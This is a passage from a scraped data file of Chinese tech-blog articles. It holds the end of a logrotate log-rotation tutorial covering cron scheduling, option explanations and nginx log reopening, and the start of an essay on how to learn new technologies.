class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">crontab</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c83520219652-2\"><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web_roteate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fv</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logro</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>因为logrotate的切割周期是weekly，每次切割都是根据上一个切割的时间来进行，如果距离上一次有一周时间，就会切割，但是我们设置了crontab的每天切割，既不会进入/etc/cron.daily/的每日切割，也不会每周切割。这样就能完美定制自己想要的切割日志时间</p>\n<h2>logrotate参数说明</h2>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c87295452174\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncompress 通过gzip 压缩转储以后的日志\r\nnocompress 不做gzip压缩处理\r\ncreate mode owner group 轮转时指定创建新文件的属性，如create 0777 nobody nobody\r\nnocreate 不建立新的日志文件\r\ndelaycompress 和compress 一起使用时，转储的日志文件到下一次转储时才压缩\r\nnodelaycompress 覆盖 delaycompress 选项，转储同时压缩。\r\nmissingok 如果日志丢失，不报错继续滚动下一个日志\r\nifempty 即使日志文件为空文件也做轮转，这个是logrotate的缺省选项。\r\nnotifempty 当日志文件为空时，不进行轮转\r\nmail address 把转储的日志文件发送到指定的E-mail 地址\r\nolddir directory 转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统\r\nnoolddir 转储后的日志文件和当前日志文件放在同一个目录下\r\nsharedscripts 运行postrotate脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本\r\nprerotate 在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行\r\npostrotate 在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行\r\ndaily 指定转储周期为每天\r\nweekly 指定转储周期为每周\r\nmonthly 指定转储周期为每月\r\nrotate count 指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份\r\ndateext 使用当期日期作为命名格式\r\ndateformat .%s 配合dateext使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合dateext使用，只支持 %Y %m %d %s 这四个参数\r\nsize(或minsize) log-size 当日志文件到达指定的大小时才转储，log-size能指定bytes(缺省)及KB (sizek)或MB(sizem).\r\n当日志文件 &gt;= log-size 的时候就转储。 以下为合法格式：（其他格式的单位大小写没有试过）\r\nsize = 5 或 size 5 （&gt;= 5 个字节就转储）\r\nsize = 100k 或 size 100k\r\nsize = 100M 或 size 100M</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c87295452174-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c87295452174-26\">26</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-1\"><span class=\"crayon-i\">compress</span><span class=\"crayon-h\"> </span>通过<span class=\"crayon-i\">gzip</span><span class=\"crayon-h\"> </span>压缩转储以后的日志</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-2\"><span class=\"crayon-i\">nocompress</span><span class=\"crayon-h\"> </span>不做<span class=\"crayon-i\">gzip</span>压缩处理</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-3\"><span class=\"crayon-e\">create </span><span class=\"crayon-e\">mode </span><span class=\"crayon-e\">owner </span><span class=\"crayon-i\">group</span><span class=\"crayon-h\"> </span>轮转时指定创建新文件的属性，如<span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0777</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nobody </span><span class=\"crayon-e\">nobody</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-4\"><span class=\"crayon-i\">nocreate</span><span class=\"crayon-h\"> </span>不建立新的日志文件</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-5\"><span class=\"crayon-i\">delaycompress</span><span class=\"crayon-h\"> </span>和<span class=\"crayon-i\">compress</span><span class=\"crayon-h\"> </span>一起使用时，转储的日志文件到下一次转储时才压缩</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-6\"><span class=\"crayon-i\">nodelaycompress</span><span class=\"crayon-h\"> </span>覆盖<span class=\"crayon-h\"> </span><span class=\"crayon-i\">delaycompress</span><span class=\"crayon-h\"> </span>选项，转储同时压缩。</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-7\"><span class=\"crayon-i\">missingok</span><span class=\"crayon-h\"> </span>如果日志丢失，不报错继续滚动下一个日志</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-8\"><span class=\"crayon-i\">ifempty</span><span class=\"crayon-h\"> </span>即使日志文件为空文件也做轮转，这个是<span class=\"crayon-i\">logrotate</span>的缺省选项。</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-9\"><span class=\"crayon-i\">notifempty</span><span class=\"crayon-h\"> </span>当日志文件为空时，不进行轮转</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-10\"><span class=\"crayon-e\">mail </span><span class=\"crayon-i\">address</span><span class=\"crayon-h\"> </span>把转储的日志文件发送到指定的<span class=\"crayon-v\">E</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">mail</span><span class=\"crayon-h\"> </span>地址</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-11\"><span class=\"crayon-e\">olddir </span><span class=\"crayon-i\">directory</span><span class=\"crayon-h\"> </span>转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-12\"><span class=\"crayon-i\">noolddir</span><span class=\"crayon-h\"> </span>转储后的日志文件和当前日志文件放在同一个目录下</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-13\"><span class=\"crayon-i\">sharedscripts</span><span class=\"crayon-h\"> </span>运行<span class=\"crayon-i\">postrotate</span>脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-14\"><span class=\"crayon-i\">prerotate</span><span class=\"crayon-h\"> </span>在<span class=\"crayon-i\">logrotate</span>转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-15\"><span class=\"crayon-i\">postrotate</span><span class=\"crayon-h\"> </span>在<span class=\"crayon-i\">logrotate</span>转储之后需要执行的指令，例如重新启动<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">HUP</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>某个服务！必须独立成行</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-16\"><span class=\"crayon-i\">daily</span><span class=\"crayon-h\"> </span>指定转储周期为每天</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-17\"><span class=\"crayon-i\">weekly</span><span class=\"crayon-h\"> </span>指定转储周期为每周</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-18\"><span class=\"crayon-i\">monthly</span><span class=\"crayon-h\"> </span>指定转储周期为每月</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-19\"><span class=\"crayon-e\">rotate </span><span class=\"crayon-i\">count</span><span class=\"crayon-h\"> </span>指定日志文件删除之前转储的次数，<span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span>指没有备份，<span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>指保留<span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>个备份</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-20\"><span class=\"crayon-i\">dateext</span><span class=\"crayon-h\"> </span>使用当期日期作为命名格式</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-21\"><span class=\"crayon-i\">dateformat</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span>配合<span class=\"crayon-i\">dateext</span>使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合<span class=\"crayon-i\">dateext</span>使用，只支持<span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">Y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span>这四个参数</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-22\"><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span>或<span class=\"crayon-v\">minsize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span>当日志文件到达指定的大小时才转储，<span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">size</span>能指定<span class=\"crayon-e\">bytes</span><span class=\"crayon-sy\">(</span>缺省<span class=\"crayon-sy\">)</span>及<span class=\"crayon-e\">KB</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sizek</span><span class=\"crayon-sy\">)</span>或<span class=\"crayon-e\">MB</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sizem</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-23\">当日志文件<span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span>的时候就转储。<span class=\"crayon-h\"> </span>以下为合法格式：（其他格式的单位大小写没有试过）</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-24\"><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>（<span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>个字节就转储）</div><div class=\"crayon-line\" id=\"crayon-594bd526b1c87295452174-25\"><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100k</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100k</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c87295452174-26\"><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100M</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100M</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0077 seconds] -->\r\n<p><strong>值得注意的一个配置是：copytruncate</strong><br>\n<code>copytruncate</code> <em>如果没有这个选项的话，操作方式：是将原log日志文件，移动成类似log.1的旧文件， 然后创建一个新的文件。 如果设置了，操作方式：拷贝原日志文件，并且将其变成大小为0的文件。</em></p>\n<p>区别是如果进程,比如nginx 使用了一个文件写日志，没有copytruncate的话，切割日志时， 把旧日志log-&gt;log.1 ，然后创建新日志log。这时候nginx 打开的文件描述符依然时log.1，由没有信号通知nginx 要换日志描述符，所以它会继续向log.1写日志，这样就不符合我们的要求了。 因为我们想切割日志后，nginx 自动会向新的log 文件写日志，而不是旧的log.1文件</p>\n<p>解决方法有两个：</p>\n<p>1.向上面的nginx 切割日志配置，再postrotate里面写个脚本</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd526b1c8c823744502\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npostrotate  # 在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行\r\n    [ -s /run/nginx.pid ] &amp;&amp; kill -USR1 `cat /run/nginx.pid`\r\nendscript</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c8c823744502-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd526b1c8c823744502-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd526b1c8c823744502-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd526b1c8c823744502-1\"><span class=\"crayon-v\">postrotate</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\"># 在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd526b1c8c823744502-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">USR1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-594bd526b1c8c823744502-3\"><span class=\"crayon-v\">endscript</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>这样就是发信号给nginx ,让nginx 关闭旧日志文件描述符，重新打开新的日志文件描述，并写入日志</p>\n<p>2.使用<code>copytruncate</code>参数，向上面说的，配置了它以后，操作方式是把log 复制一份 成为log.1，然后清空log的内容，使大小为0，那此时log依然时原来的旧log，对进程（nginx）来说，依然打开的是原来的文件描述符，可以继续往里面写日志，而不用发送信号给nginx</p>\n<p>copytruncate这种方式操作的时候， 拷贝和清空之间有一个时间差，可能会丢失部分日志数据。<br>\n<code>nocopytruncate</code> 备份日志文件不过不截断</p>\n<h3>参考</h3>\n<p>《<a href=\"http://blog.jobbole.com/111385/\" target=\"_blank\">Linux下logrotate日志轮询操作梳理</a>》</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111405\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111405votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111405\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/59d49abe8909a122bc2c9aa43b71e3bb.png"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/08", "praise_nums": 1}
{"tags": "技术, 3 评论 ,IT技术,学习", "front_image_path": "full/bb01e2ca1f5120e2d1d54d907dedbdacbe7ac6fe.jpg", "title": "如何学习新技术", "url_object_id": "33774ebfe2e8ff67a967671814814e03", "url": "http://blog.jobbole.com/111240/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://heleifz.github.io/index.html\">Helei</a>   </div><p>我从 2009年～2010 年左右开始学习信息技术，从初期围绕单片机做电子设计，一路浅尝辄止，走马观花。什么语言都用过，在各种平台上都干过活，有用的没用的都学了一些，一路尝鲜一路丢。</p>\n<p>虽然有识之士们都说，光靠广度没法找到工作，要对一门手艺有深度，到达深奥幽玄的境界。我自知能力有限，更何况，工作后每日加班，精力不济，能让我一窥天道的时间窗口越来越窄了。</p>\n<p>即便如此，我也不觉得自己不行，这就是愚蠢人的乐趣。因为总有与你同样愚蠢的人，他们很快乐，我为什么不能快乐。我不仅快乐，而且要分享，要写作，本文就谈谈在下走马观花的本领。</p>\n<h3 id=\"toc_0\">兴味使然</h3>\n<p>首先要解决驱动力的问题，即便走马观花，心里也得有股劲，是不是？所以你得喜欢编程这门手艺，不喜欢，那至少也得好奇，当个好奇宝宝。既不喜欢，也无好奇心，自主学习就没法成立。</p>\n<p>既然喜欢这门手艺，热爱这个行业，那么你自然有感兴趣的领域，或者小问题，这就是学习新技术前要做的第一件事，确定一个你感兴趣的方向。</p>\n<p>有的朋友爱流行技术，因为网民们在学，所以他也想学。或者就业市场需要某个技能，所以被迫去学。这当然好啦，针对性地优化你的简历，在求职时候有用，但也仅限于此了。</p>\n<p>兴味使然的学习完全不同，你能用更加轻松的心态看待每个知识点，也能在适当的时候深入挖掘一些现象的背后原因，这是一个充满快感的旅程，没有人提醒你：那里不是考点。</p>\n<h3 id=\"toc_1\">探寻入口</h3>\n<p>选择了方向以后，就该选学习材料了。随处可见的大型书单其实用处有限，因为材料的准备是分阶段的，侧重点不同的，这个过程伴随着你对该领域的初步认识的建立，混杂着你的直觉，常识，以及一点点随机性。</p>\n<p>首先，做一些”自由探索”，闭上眼睛，听听伟大的互联网在你耳边的低语：Google，维基百科，问答社区。从庞杂的噪声中，你需要找到以下知识点：</p>\n<ol>\n<li>基本定义：例如，机器学习是什么，不是什么？与相关概念（人工智能）之间的区别和联系。</li>\n<li>主要工具：例如，机器学习的理论工具是什么，实践方式是什么？</li>\n<li>核心问题或矛盾：例如，机器学习研究或应用中面临的基本问题是什么？</li>\n</ol>\n<p>同时，也要了解几个主要的资料源（每个资料源不一定都适合你），例如：</p>\n<ol>\n<li>coursera/edx 公开课</li>\n<li>大部头教材英文版，中文版</li>\n<li>由网友编写的野鸡教程</li>\n</ol>\n<p>基本概念的探寻，学习资料的搜索，两个过程并不相互独立。基本概念的逐步建立，能帮助你更高效地筛选资料，而好的学习资料往往会花相当的篇幅来阐明基本概念。</p>\n<p>不专业的作者，要么开篇就贴代码，深入细节，要么对某项技术过渡吹捧，盲目狂热。好的学习材料也许轻松幽默，也许精确冷峻，但绝对不愚蠢。请务必花时间浏览各个教材前 5% 的内容，慢慢甄别优劣。</p>\n<p>此外，好的学习资料，能够包含适当的实践内容。无论是数学题还是编程题，能否找到参考答案，是否提供代码实验环境，都是很重要的因素。</p>\n<p>举几个例子，<a href=\"https://mitpress.mit.edu/sicp/\">SICP</a>，每道题都能在 Racket 上做实验，网上也能找到<a href=\"http://community.schemewiki.org/?SICP-Solutions\">大家的解题方法</a>；斯坦福 <a href=\"http://web.stanford.edu/class/cs224n/\">CS224N</a>课程，完整的习题解答和项目环境；<a href=\"https://heleifz.github.io/The%20Elements%20of%20Computing%20Systems%20_%20Nisan%20&amp;%20Schocken\">Nand2tetris</a>，甚至有一整套硬件描述语言，虚拟机的环境，非常优秀。也有不好的例子，<a 